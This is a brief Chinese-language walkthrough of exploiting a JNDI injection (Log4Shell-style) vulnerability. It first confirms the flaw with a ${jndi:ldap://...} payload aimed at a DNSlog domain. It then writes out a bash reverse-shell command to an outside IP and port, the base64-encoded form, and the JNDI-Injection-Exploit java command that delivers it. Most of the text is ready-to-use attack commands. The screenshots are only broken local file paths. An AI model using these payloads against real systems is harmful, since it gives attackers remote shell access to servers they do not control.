###### 1.DNSlog验证

首先再DNSlog获取域名，构造payload：payload=${jndi:ldap://tr2gk6.dnslog.cn}

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image002.jpg)

 

DNSlog网站接收到解析记录，说明存在漏洞

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image004.jpg)

 

###### **2.** JNDI注入反弹shell

首先下载好JNDI注入工具，上传到云服务器上

 

反弹shell指令:

bash -i >& /dev/tcp/124.222.155.178/8888 0>&1

 

进行base64编码

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image006.jpg)

 

JNDI启动:

第一处标红部分是经过base64编码过后的指令，第二处是监听服务器的IP地址。

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c "{echo,CmJhc2ggLWkgPiYgL2Rldi90Y3AvMTI0LjIyMi4xNTUuMTc4Lzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}" -A 124.222.155.178

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image008.jpg)

测试了用前两个都不行，使用第三个监听到了

 

设置监听

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image010.jpg)

 

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image012.jpg)

 

反弹成功

![img](file:///C:/Users/zhong/AppData/Local/Temp/msohtmlclip1/01/clip_image014.jpg)

 

 